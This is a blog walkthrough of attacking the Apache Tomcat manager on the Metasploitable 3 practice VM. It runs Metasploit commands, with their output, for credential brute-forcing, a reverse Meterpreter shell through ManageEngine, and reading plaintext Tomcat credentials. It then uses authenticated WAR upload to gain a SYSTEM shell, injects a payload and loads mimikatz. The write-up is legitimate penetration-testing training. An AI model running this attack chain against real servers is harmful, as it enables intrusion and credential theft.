---
layout: post
title: "Metasploitable 3 - Exploiting Tomcat"
date: 2017-01-21T05:28:00Z
author: gu4r15sm0
---

## Metasploitable 3

### 
Exploiting Tomcat

If you remember, this are the services that NMAP found running on metasploitable 3, on TCP port 8282 there's a Apache Tomcat server running and that's the one I'll exploit for this post.
Services
========
host Â  Â  Â  Â  port Â  proto Â name Â  Â  Â  Â  Â state Â info
---- Â  Â  Â  Â  ---- Â  ----- Â ---- Â  Â  Â  Â  Â ----- Â ----
10.20.10.23 Â 21 Â  Â  tcp Â  Â ftp Â  Â  Â  Â  Â  open Â  Microsoft ftpd
10.20.10.23 Â 22 Â  Â  tcp Â  Â ssh Â  Â  Â  Â  Â  open Â  OpenSSH 7.1 protocol 2.0
10.20.10.23 Â 80 Â  Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  Microsoft-IIS/7.5 ( Powered by ASP.NET )
10.20.10.23 Â 161 Â  Â udp Â  Â snmp Â  Â  Â  Â  Â open Â  SNMPv1 server public
10.20.10.23 Â 445 Â  Â tcp Â  Â smb Â  Â  Â  Â  Â  open
10.20.10.23 Â 1617 Â  tcp Â  Â nimrod-agent Â open
10.20.10.23 Â 3000 Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  WEBrick/1.3.1 (Ruby/2.3.1/2016-04-26)
10.20.10.23 Â 4848 Â  tcp Â  Â https Â  Â  Â  Â  open Â  Oracle GlassFish 4.0 Servlet 3.1; JSP 2.3; Java 1.8
10.20.10.23 Â 5985 Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.20.10.23 Â 5986 Â  tcp Â  Â http Â  Â  Â  Â  Â open
10.20.10.23 Â 8020 Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  Apache httpd
10.20.10.23 Â 8022 Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  Apache Tomcat/Coyote JSP engine 1.1
10.20.10.23 Â 8027 Â  tcp Â  Â  Â  Â  Â  Â  Â  Â  Â open
10.20.10.23 Â 8080 Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  Oracle GlassFish 4.0 Servlet 3.1; JSP 2.3; Java 1.8
**10.20.10.23 Â 8282 Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  Apache-Coyote/1.1**
10.20.10.23 Â 8383 Â  tcp Â  Â https Â  Â  Â  Â  open Â  Apache httpd
10.20.10.23 Â 8484 Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  Jetty winstone-2.8
10.20.10.23 Â 8585 Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  Apache/2.2.21 (Win64) PHP/5.3.10 DAV/2 ( Powered by PHP/5.3.10 )
10.20.10.23 Â 9200 Â  tcp Â  Â http Â  Â  Â  Â  Â open Â  Elasticsearch REST API 1.1.1 name: Mammomax; Lucene 4.7
10.20.10.23 Â 9800 Â  tcp Â  Â http Â  Â  Â  Â  Â open
10.20.10.23 Â 49153 Â tcp Â  Â msrpc Â  Â  Â  Â  open Â  Microsoft Windows RPC
10.20.10.23 Â 49154 Â tcp Â  Â msrpc Â  Â  Â  Â  open Â  Microsoft Windows RPC
10.20.10.23 Â 49263 Â tcp Â  Â  Â  Â  Â  Â  Â  Â  Â open
10.20.10.23 Â 49264 Â tcp Â  Â tcpwrapped Â  Â open
When I use my browser I can confirm it's a Apache Tomcat and it's showing the default web site with a link to the manager webapp.

[![](/assets/images/tomcat-8282.jpg)](/assets/images/tomcat-8282.jpg)

Apache Tomcat's default web site with manager webapp link

Clicking on the link shows me a dialog box requesting Authentication.

[![](/assets/images/tomcat-8282-manager-login.jpg)](/assets/images/tomcat-8282-manager-login.jpg)

Authentication Request for /manager/html

After failing several combinations of usernames and passwords to login, I clicked on the Cancel button and find a 401 Unauthorized message disclosing information about where to find credentials for the web manager app.

[![](/assets/images/tomcat-8282-manager-login-401.jpg)](/assets/images/tomcat-8282-manager-login-401.jpg)

Authentication fails with a 401 message and Disclosure of Information

It seems the credentials can be found in a conf/tomcat-users.xml file somewhere in the file system.
First, let's try a simple brutforce using metasploit to see if we can guess the username and password from the built-in word lists.

```bash
msf > info auxiliary/scanner/http/tomcat_mgr_login
Â  Â  Â  Â Name: Tomcat Application Manager Login Utility
Â  Â  Â Module: auxiliary/scanner/http/tomcat_mgr_login
Â  Â  License: Metasploit Framework License (BSD)
Â  Â  Â  Â Rank: Normal
Provided by:
Â  MC <mc@metasploit.com>
Â  Matteo Cantoni <goony@nothink.org>
Â  jduck <jduck@metasploit.com>
Basic options:
Â  Name Â  Â  Â  Â  Â  Â  Â Current Setting Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Required Â Description
Â  ---- Â  Â  Â  Â  Â  Â  Â --------------- Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  -------- Â -----------
Â  BLANK_PASSWORDS Â  false Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â Try blank passwords for all users
Â  BRUTEFORCE_SPEED Â 5 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  yes Â  Â  Â  How fast to bruteforce, from 0 to 5
Â  DB_ALL_CREDS Â  Â  Â false Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â Try each user/password couple stored in the current database
Â  DB_ALL_PASS Â  Â  Â  false Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â Add all passwords in the current database to the list
Â  DB_ALL_USERS Â  Â  Â false Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â Add all users in the current database to the list
Â  PASSWORD Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â no Â  Â  Â  Â The HTTP password to specify for authentication
Â  PASS_FILE Â  Â  Â  Â  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt Â  Â  Â no Â  Â  Â  Â File containing passwords, one per line
Â  Proxies Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â A proxy chain of format type:host:port[,type:host:port][...]
Â  RHOSTS Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â yes Â  Â  Â  The target address range or CIDR identifier
Â  RPORT Â  Â  Â  Â  Â  Â  8080 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â yes Â  Â  Â  The target port
Â  SSL Â  Â  Â  Â  Â  Â  Â  false Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â Negotiate SSL/TLS for outgoing connections
Â  STOP_ON_SUCCESS Â  false Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  yes Â  Â  Â  Stop guessing when a credential works for a host
Â  TARGETURI Â  Â  Â  Â  /manager/html Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  yes Â  Â  Â  URI for Manager login. Default is /manager/html
Â  THREADS Â  Â  Â  Â  Â  1 Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  yes Â  Â  Â  The number of concurrent threads
Â  USERNAME Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â no Â  Â  Â  Â The HTTP username to specify for authentication
Â  USERPASS_FILE Â  Â  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt Â no Â  Â  Â  Â File containing users and passwords separated by space, one pair per line
Â  USER_AS_PASS Â  Â  Â false Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â Try the username as the password for all users
Â  USER_FILE Â  Â  Â  Â  /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt Â  Â  no Â  Â  Â  Â File containing users, one per line
Â  VERBOSE Â  Â  Â  Â  Â  true Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â yes Â  Â  Â  Whether to print output for all attempts
Â  VHOST Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â HTTP server virtual host
Description:
Â  *This module simply attempts to login to a Tomcat Application Manager*
Â  *instance using a specific user/pass.*
References:
Â  https://cvedetails.com/cve/CVE-2009-3843/
Â  OSVDB (60317)
Â  http://www.securityfocus.com/bid/37086
Â  https://cvedetails.com/cve/CVE-2009-4189/
Â  OSVDB (60670)
Â  http://www.harmonysecurity.com/blog/2009/11/hp-operations-manager-backdoor-account.html
Â  http://www.zerodayinitiative.com/advisories/ZDI-09-085
Â  https://cvedetails.com/cve/CVE-2009-4188/
Â  http://www.securityfocus.com/bid/38084
Â  https://cvedetails.com/cve/CVE-2010-0557/
Â  http://www-01.ibm.com/support/docview.wss?uid=swg21419179
Â  https://cvedetails.com/cve/CVE-2010-4094/
Â  http://www.zerodayinitiative.com/advisories/ZDI-10-214
Â  https://cvedetails.com/cve/CVE-2009-3548/
Â  OSVDB (60176)
Â  http://www.securityfocus.com/bid/36954
Â  http://tomcat.apache.org/
Â  https://cvedetails.com/cve/CVE-1999-0502/
```

I setup my RHOST and RPORT, and run the module

```bash
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) > set RHOSTS 10.20.10.23
```

RHOSTS => 10.20.10.23
msf auxiliary(tomcat_mgr_login) > set RPORT 8282
RPORT => 8282
msf auxiliary(tomcat_mgr_login) > run
[-] 10.20.10.23:8282 - LOGIN FAILED: admin:admin (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: admin:manager (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: admin:role1 (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: admin:root (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: admin:tomcat (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: admin:s3cret (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: admin:vagrant (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: manager:admin (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: manager:manager (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: manager:role1 (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: manager:root (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: manager:tomcat (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: manager:s3cret (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: manager:vagrant (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: role1:admin (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: role1:manager (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: role1:role1 (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: role1:root (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: role1:tomcat (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: role1:s3cret (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: role1:vagrant (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: root:admin (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: root:manager (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: root:role1 (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: root:root (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: root:tomcat (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: root:s3cret (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: root:vagrant (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: tomcat:admin (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: tomcat:manager (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: tomcat:role1 (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: tomcat:root (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: tomcat:tomcat (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: tomcat:s3cret (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: tomcat:vagrant (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: both:admin (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: both:manager (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: both:role1 (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: both:root (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: both:tomcat (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: both:s3cret (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: both:vagrant (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: ovwebusr:OvW\*busr1 (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: root:owaspbwa (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: xampp:xampp (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: tomcat:s3cret (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: QCC:QLogic66 (Incorrect)
[-]Â 10.20.10.23:8282 - LOGIN FAILED: admin:vagrant (Incorrect)
[\*] Scanned 1 of 1 hosts (100% complete)
[\*] Auxiliary module execution completed
msf auxiliary(tomcat_mgr_login) >
NO LUCK! ğŸ‘
OK, plan B... we use the disclosed information from the *401 Unauthorized* access web page, it says there's a *conf/tomcat-users.xml* somewhere, so we use [an older exploit](http://gu4r15m0.blogspot.com/2017/01/metasploitable-3-manageengine.html) to go look for it.
msf exploit(manageengine_connectionid_write) > run
[\*] Started reverse TCP handler on 10.23.10.200:4444
[\*] Creating JSP stager
[\*] Uploading JSP stager Oynza.jsp...
[\*] Executing stager...
[\*] Sending stage (957487 bytes) to 10.20.10.23
[\*] Meterpreter session 3 opened (10.23.10.200:4444 -> 10.20.10.23:50324) at 2017-01-20 22:26:44 -0500
[+] Deleted ../webapps/DesktopCentral/jspf/Oynza.jsp

```bash
meterpreter > info
Usage: info <module>
```

Prints information about a post-exploitation module
meterpreter > sysinfo
Computer Â  Â  Â  Â : METASPLOITABLE3
OS Â  Â  Â  Â  Â  Â  Â : Windows 2008 R2 (Build 7601, Service Pack 1).
Architecture Â  Â : x64
System Language : en_US
Domain Â  Â  Â  Â  Â : WORKGROUP
Logged On Users : 2
Meterpreter Â  Â  : x86/windows

```bash
meterpreter >
meterpreter > getuid
```
```


Server username: **NT AUTHORITY\\LOCAL SERVICE**

```bash
meterpreter > pwd
C:\ManageEngine\DesktopCentral_Server\bin
meterpreter > cd /
meterpreter > pwd
C:\
meterpreter > search -f tomcat-users.xml
```

Found 3 results...
Â  Â  c:\ManageEngine\DesktopCentral_Server\conf\tomcat-users.xml (70 bytes)
Â  Â  c:\Program Files\Apache Software Foundation\tomcat\apache-tomcat-8.0.33\conf\tomcat-users.xml (2309 bytes)
Â  Â  c:\vagrant\resources\apache_struts\tomcat-users.xml (2309 bytes)
meterpreter > cat /Program\ Files/Apache\ Software\ Foundation/tomcat/apache-tomcat-8.0.33/conf/tomcat-users.xml
<?xml version='1.0' encoding='utf-8'?>
...
<!--
Â  NOTE: Â The sample user and role entries below are intended for use with the
Â  examples web application. They are wrapped in a comment and thus are ignored
Â  when reading this file. If you wish to configure these users for use with the
Â  examples web application, do not forget to remove the <!.. ..> that surrounds
Â  them. You will also need to set the passwords to something appropriate.
\-->
<!--
Â  <role rolename="tomcat"/>
Â  <role rolename="role1"/>
Â  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
Â  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
Â  <user username="role1" password="<must-be-changed>" roles="role1"/>
\-->
Â  <role rolename="manager-gui"/>
Â  <user username="sploit" password="sploit" roles="manager-gui"/>
</tomcat-users>
```

Just like the 401 Page said, there's a manager gui role setup with a username and password in clear text, sploit/sploit
Now I have a gui managers credentials and can try to get a meterpreter with another exploit.

```bash
msf auxiliary(tomcat_mgr_login) > info exploit/multi/http/tomcat_mgr_upload
Â  Â  Â  Â Name: Apache Tomcat Manager Authenticated Upload Code Execution
Â  Â  Â Module: exploit/multi/http/tomcat_mgr_upload
Â  Â Platform: Java, Linux, Windows
Â Privileged: No
Â  Â  License: Metasploit Framework License (BSD)
Â  Â  Â  Â Rank: Excellent
Â  Disclosed: 2009-11-09
Provided by:
Â  rangercha
Available targets:
Â  Id Â Name
Â  -- Â ----
Â  0 Â  Automatic
Â  1 Â  Java Universal
Â  2 Â  Windows Universal
Â  3 Â  Linux x86
Basic options:
Â  Name Â  Â  Â  Â  Â Current Setting Â Required Â Description
Â  ---- Â  Â  Â  Â  Â --------------- Â -------- Â -----------
Â  HttpPassword Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â The password for the specified username
Â  HttpUsername Â  Â  Â  Â  Â  Â  Â  Â  Â  no Â  Â  Â  Â The username to authenticate as
Â  Proxies Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â no Â  Â  Â  Â A proxy chain of format type:host:port[,type:host:port][...]
Â  RHOST Â  Â  Â  Â  10.20.10.23 Â  Â  Â yes Â  Â  Â  The target address
Â  RPORT Â  Â  Â  Â  80 Â  Â  Â  Â  Â  Â  Â  yes Â  Â  Â  The target port
Â  SSL Â  Â  Â  Â  Â  false Â  Â  Â  Â  Â  Â no Â  Â  Â  Â Negotiate SSL/TLS for outgoing connections
Â  TARGETURI Â  Â  /manager Â  Â  Â  Â  yes Â  Â  Â  The URI path of the manager app (/html/upload and /undeploy will be used)
Â  VHOST Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â no Â  Â  Â  Â HTTP server virtual host
Payload information:
Description:
Â  *This module can be used to execute a payload on Apache Tomcat*
Â  *servers that have an exposed "manager" application. The payload is*
Â  *uploaded as a WAR archive containing a jsp application using a POST*
Â  *request against the /manager/html/upload component. NOTE: The*
Â  *compatible payload sets vary based on the selected target. For*
Â  *example, you must select the Windows target to use native Windows*
Â  *payloads.*
References:
Â  https://cvedetails.com/cve/CVE-2009-3843/
Â  OSVDB (60317)
Â  https://cvedetails.com/cve/CVE-2009-4189/
Â  OSVDB (60670)
Â  https://cvedetails.com/cve/CVE-2009-4188/
Â  http://www.securityfocus.com/bid/38084
Â  https://cvedetails.com/cve/CVE-2010-0557/
Â  http://www-01.ibm.com/support/docview.wss?uid=swg21419179
Â  https://cvedetails.com/cve/CVE-2010-4094/
Â  http://www.zerodayinitiative.com/advisories/ZDI-10-214
Â  https://cvedetails.com/cve/CVE-2009-3548/
Â  OSVDB (60176)
Â  http://www.securityfocus.com/bid/36954
Â  http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html
msf auxiliary(tomcat_mgr_login) > use exploit/multi/http/tomcat_mgr_upload
Setup username and password found in the tomcat-users.xml
msf exploit(tomcat_mgr_upload) > set HttpPassword sploit
HttpPassword => sploit
msf exploit(tomcat_mgr_upload) > set HttpUsername sploit
HttpUsername => sploit
Setup metasploitable 3 IP address and Tomcat TCP Port
msf exploit(tomcat_mgr_upload) > set RHOST 10.20.10.23
RHOST => 10.20.10.23
msf exploit(tomcat_mgr_upload) > set RPORT 8282
And exploit!
msf exploit(tomcat_mgr_upload) > run
[\*] Started reverse TCP handler on 10.23.10.200:4444
[\*]Â Retrieving session ID and CSRF token...
[\*]Â Uploading and deploying 4MLnXRl...
[\*]Â Executing 4MLnXRl...
[\*]Â Sending stage (957487 bytes) to 10.20.10.23
[\*]Â Undeploying 4MLnXRl ...
[\*]Â Meterpreter session 4 opened (10.23.10.200:4444 -> 10.20.10.23:50340) at 2017-01-20 23:17:06 -0500
meterpreter > sysinfo
Computer Â  Â  Â  Â : METASPLOITABLE3
OS Â  Â  Â  Â  Â  Â  Â : Windows 2008 R2 (Build 7601, Service Pack 1).
Architecture Â  Â : x64
System Language : en_US
Domain Â  Â  Â  Â  Â : WORKGROUP
Logged On Users : 2
Meterpreter Â  Â  : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
Great!, I have a 32bit meterpreter with SYSTEM privileges

Let's get a 64bit meterpreter so I can run other tools like mimikats fully.

I send the meterpreter session to the background so I can use it to inject a second payload

meterpreter > background

[\*] Backgrounding session 4...
```


I used a payload_inject exploit for Windows and set the payload to a reverse TCP 64 bit meterprter


```bash
msf exploit(tomcat_mgr_upload) > use exploit/windows/local/payload_inject

msf exploit(payload_inject) > info exploit/windows/local/payload_inject


Â  Â  Â  Â Name: Windows Manage Memory Payload Injection

Â  Â  Â Module: exploit/windows/local/payload_inject

Â  Â Platform: Windows
```


Â Privileged: No

Â  Â  License: Metasploit Framework License (BSD)

Â  Â  Â  Â Rank: Excellent

Â  Disclosed: 2011-10-12

Provided by:

Â  Carlos Perez <carlos_perez@darkoperator.com>

Â  sinn3r <sinn3r@metasploit.com>

Available targets:

Â  Id Â Name

Â  -- Â ----

Â  0 Â  Windows

Basic options:

Â  Name Â  Â  Â  Â Current Setting Â Required Â Description

Â  ---- Â  Â  Â  Â --------------- Â -------- Â -----------

Â  NEWPROCESS Â false Â  Â  Â  Â  Â  Â no Â  Â  Â  Â New notepad.exe to inject to

Â  PID Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â no Â  Â  Â  Â Process Identifier to inject of process to inject payload.

Â  SESSION Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â yes Â  Â  Â  The session to run this module on.

Payload information:

Â  Space: 4096

Description:

Â  *This module will inject a payload into memory of a process. If a*

Â  *payload isn't selected, then it'll default to a reverse x86 TCP*

Â  *meterpreter. If the PID datastore option isn't specified, then it'll inject into notepad.exe instead.*


```bash
msf exploit(payload_inject) > options

Module options (exploit/windows/local/payload_inject):


Â  Â Name Â  Â  Â  Â Current Setting Â Required Â Description

Â  Â ---- Â  Â  Â  Â --------------- Â -------- Â -----------

Â  Â NEWPROCESS Â false Â  Â  Â  Â  Â  Â no Â  Â  Â  Â New notepad.exe to inject to

Â  Â PID Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â no Â  Â  Â  Â Process Identifier to inject of process to inject payload.

Â  Â SESSION Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â yes Â  Â  Â  The session to run this module on.
```


Exploit target:

Â  Â Id Â Name

Â  Â -- Â ----

Â  Â 0 Â  Windows

msf exploit(payload_inject) > set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp


```bash
msf exploit(payload_inject) > options

Module options (exploit/windows/local/payload_inject):


Â  Â Name Â  Â  Â  Â Current Setting Â Required Â Description

Â  Â ---- Â  Â  Â  Â --------------- Â -------- Â -----------

Â  Â NEWPROCESS Â false Â  Â  Â  Â  Â  Â no Â  Â  Â  Â New notepad.exe to inject to

Â  Â PID Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â no Â  Â  Â  Â Process Identifier to inject of process to inject payload.

Â  Â SESSION Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â yes Â  Â  Â  The session to run this module on.
```


Payload options (windows/x64/meterpreter/reverse_tcp):

Â  Â Name Â  Â  Â Current Setting Â Required Â Description

Â  Â ---- Â  Â  Â --------------- Â -------- Â -----------

Â  Â EXITFUNC Â process Â  Â  Â  Â  Â yes Â  Â  Â  Exit technique (Accepted: '', seh, thread, process, none)

Â  Â LHOST Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â yes Â  Â  Â  The listen address

Â  Â LPORT Â  Â  4444 Â  Â  Â  Â  Â  Â  yes Â  Â  Â  The listen port

Exploit target:

Â  Â Id Â Name

Â  Â -- Â ----

Â  Â 0 Â  Windows

Set my local port and local IP address to be used for a listener for the second meterpreter

msf exploit(payload_inject) > set LPORT 4467

LPORT => 4467

msf exploit(payload_inject) > set LHOST 10.23.10.200

LHOST => 10.23.10.200

msf exploit(payload_inject) > sessions

Active sessions

===============

Â  Id Â Type Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Information Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Connection

Â  -- Â ---- Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  ----------- Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â ----------

Â  4 Â  meterpreter x86/windows Â NT AUTHORITY\SYSTEM @ METASPLOITABLE3 Â 10.23.10.200:4444 -> 10.20.10.23:50340 (10.20.10.23)
```


I tell the exploit to use my background 32bit session for the injection


```bash
msf exploit(payload_inject) > set session 4

session => 4

msf exploit(payload_inject) > run

[\*] Started reverse TCP handler on 10.23.10.200:4467

[\*] Running module against METASPLOITABLE3

[-] PID Â does not actually exist.

[\*] Launching notepad.exe...

[\*] Preparing 'windows/x64/meterpreter/reverse_tcp' for PID 6068

[\*] Sending stage (1189423 bytes) to 10.20.10.23

[\*] Meterpreter session 5 opened (10.23.10.200:4467 -> 10.20.10.23:50345) at 2017-01-20 23:30:34 -0500

meterpreter > sysinfo

Computer Â  Â  Â  Â : METASPLOITABLE3

OS Â  Â  Â  Â  Â  Â  Â : Windows 2008 R2 (Build 7601, Service Pack 1).
```


Architecture Â  Â : x64

System Language : en_US

Domain Â  Â  Â  Â  Â : WORKGROUP

Logged On Users : 2

Meterpreter Â  Â  : **x64/windows ğŸ‘**


```bash
meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

meterpreter > load mimikatz

Loading extension mimikatz...success.

meterpreter > mimikatz... TO BE CONTINUED ... ğŸ˜
```


Also the tomcat credentials have been added to my ***creds*** table automatically in case I need them again

Credentials

===========

host Â  Â  Â  Â  origin Â  Â  Â  service Â  Â  Â  Â  Â public Â  Â  Â  Â  Â  Â private Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â realm Â private_type

---- Â  Â  Â  Â  ------ Â  Â  Â  ------- Â  Â  Â  Â  Â ------ Â  Â  Â  Â  Â  Â ------- Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â ----- Â ------------

